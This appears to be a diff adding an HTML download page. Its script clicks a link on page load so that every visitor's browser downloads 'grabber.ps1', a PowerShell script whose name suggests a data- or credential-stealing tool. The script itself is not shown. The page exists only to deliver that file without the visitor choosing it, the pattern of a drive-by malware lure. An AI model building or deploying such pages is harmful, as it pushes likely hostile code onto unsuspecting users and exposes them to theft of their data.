@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Downloading File...</title>
+</head>
+<body>
+    <h1>Your download will begin automatically...</h1>
+    <p>If the download does not start, <a id="download-link" href="grabber.ps1" download="grabber.ps1">click here to download grabber.ps1</a>.</p>
+
+    <script>
+        // Automatically trigger the download when the page loads
+        window.addEventListener('DOMContentLoaded', () => {
+            const link = document.getElementById('download-link');
+            link.click();
+        });
+    </script>
+</body>
+</html>
